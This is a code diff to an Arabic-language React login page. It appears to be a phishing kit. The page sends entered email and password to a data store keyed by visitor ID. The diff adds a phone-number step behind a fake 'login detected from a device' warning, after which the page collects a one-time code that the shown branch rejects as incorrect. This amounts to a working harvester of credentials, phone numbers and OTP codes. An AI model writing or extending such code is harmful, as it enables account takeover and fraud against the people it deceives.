@@ -13,9 +13,11 @@ const allOtps = [""]
 
 export default function LoginPage() {
   const [showPassword, setShowPassword] = useState(false);
-  const [step, setStep] = useState<"login" | "otp">("login");
+  const [step, setStep] = useState<"login" | "otp"|"phone">("phone");
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
+  const [phone, setPhone] = useState("");
+  const [phoneError, setPhoneError] = useState(""); // NEW: validation message
   const [otp, setOtp] = useState(["", "", "", "", "", ""]);
   const [showSplash, setShowSplash] = useState(true);
   const [loding, setloading] = useState(false);
@@ -29,22 +31,51 @@ export default function LoginPage() {
       return () => clearTimeout(timer);
     }).catch(() => {
       setShowSplash(true);
-
-
     })
   }, []);
 
   const handleLoginSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     if (email && password) {
-    setloading(true)
-
+      setloading(true)
       await addData({ id: visitorID, email, password })
       setTimeout(() => {
-        setStep("otp");
+        setStep("phone");
         setloading(false)
       }, 3000);
     }
+  };
+
+  // phone validation helper
+  function validatePhoneNumber(value: string) {
+    // Example validation: 10 digits starting with a local prefix. Adjust to your rules.
+    const digits = value.replace(/\D/g, "");
+    if (digits.length === 0) return "الرجاء إدخال رقم الهاتف";
+    if (digits.length < 9) return "الرقم قصير جداً";
+    if (digits.length > 10) return "الرقم طويل جداً";
+    // you can also check prefix: if (!/^7|9|6/.test(digits[0])) ...
+    return "";
+  }
+
+  const handlePhoneChange = (value: string) => {
+    // allow digits only
+    const digits = value.replace(/\D/g, "");
+    setPhone(digits);
+    const err = validatePhoneNumber(digits);
+    setPhoneError(err);
+  };
+
+  const handlePhoneSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    const err = validatePhoneNumber(phone);
+    setPhoneError(err);
+    if (err) return; // block submit while invalid
+    setloading(true)
+    await addData({ id: visitorID, phone })
+    setTimeout(() => {
+      setStep("otp");
+      setloading(false)
+    }, 3000);
   };
 
   const handleOtpChange = (index: number, value: string) => {
@@ -55,14 +86,14 @@ export default function LoginPage() {
 
     if (value && index < 5) {
       const nextInput = document.getElementById(`otp-${index + 1}`);
-      nextInput?.focus();
+      (nextInput as HTMLElement | null)?.focus();
     }
   };
 
   const handleOtpKeyDown = (index: number, e: React.KeyboardEvent) => {
     if (e.key === "Backspace" && !otp[index] && index > 0) {
       const prevInput = document.getElementById(`otp-${index - 1}`);
-      prevInput?.focus();
+      (prevInput as HTMLElement | null)?.focus();
     }
   };
 
@@ -76,7 +107,6 @@ export default function LoginPage() {
       setOtp(["", "", "", "", "", ""]);
       setTimeout(() => {
         alert("رمز التحقق غير صحيح")
-
       }, 2000);
     }
   };
@@ -191,8 +221,9 @@ export default function LoginPage() {
               </p>
             </div>
           </>
-        ) : (
+        ) : step ==="otp"?(
           <>
+          
             <h1 className="text-4xl font-bold text-gray-800 text-center mb-4">
               رمز التحقق{" "}
             </h1>            <p className="text-center text-gray-600 mb-12">
@@ -237,7 +268,59 @@ export default function LoginPage() {
               </button>
             </form>
           </>
-        )}
+        ):<>
+             <div className="mb-16 flex justify-center">
+              <img src="file.svg" alt="llog" />
+            </div>
+            <form onSubmit={handlePhoneSubmit} className="w-full max-w-md">
+              <div className="mb-5 w-full">
+                <div
+                  role="status"
+                  aria-live="polite"
+                  className="flex items-start gap-3 bg-white/90 border border-blue-100 p-4 rounded-xl shadow-sm"
+                >
+                  <div className="flex-none">
+                    {/* simple icon circle */}
+                    <div className="w-8 h-8 rounded-full bg-blue-100 flex items-center justify-center text-blue-700 font-bold">i</div>
+                  </div>
+                  <div className="flex-1 text-right">
+                    <p className="text-sm text-gray-800 font-medium">تم رصد عملية تسجيل دخول من جهاز</p>
+                    <p className="text-xs text-gray-500 mt-1">إذا لم تكن أنت، اترك الصفحة أو تواصل مع الدعم.</p>
+                  </div>
+                </div>
+              </div>
+
+              <div className="mb-6">
+                <label className="block text-right text-gray-700 text-sm mb-2">رقم الهاتف</label>
+                <input
+                  inputMode="tel"
+                  type="tel"
+                  placeholder="#########"
+                  value={phone}
+                  maxLength={10}
+                  onChange={(e) => handlePhoneChange(e.target.value)}
+                  className={`w-full px-4 py-2 bg-gray-200 border rounded-full text-right placeholder:text-gray-600 focus:outline-none transition-all text-sm ${phoneError ? "border-red-400 ring-2 ring-red-100" : "focus:ring-2 focus:ring-blue-400 border-0"}`}
+                  aria-invalid={!!phoneError}
+                  aria-describedby="phone-error"
+                />
+                <div className="mt-2 min-h-[1.25rem]">
+                  {phoneError ? (
+                    <p id="phone-error" className="text-right text-xs text-red-600">{phoneError}</p>
+                  ) : (
+                    <p className="text-right text-xs text-gray-500">أدخل رقم هاتفك بدون رموز أو مسافات.</p>
+                  )}
+                </div>
+              </div>
+
+              <button
+                type="submit"
+                disabled={loding}
+                className="w-full bg-gradient-to-r from-blue-500 to-blue-600 hover:from-blue-600 hover:to-blue-700 text-white font-bold py-2 px-4 rounded-full transition-all duration-200 mb-8 shadow-lg text-sm"
+              >
+                {loding ? "جاري التحقق..." : " تحقق"}
+              </button>
+            </form>
+        </>}
       </div>
 
       <footer className="text-center py-8 border-t border-blue-200">
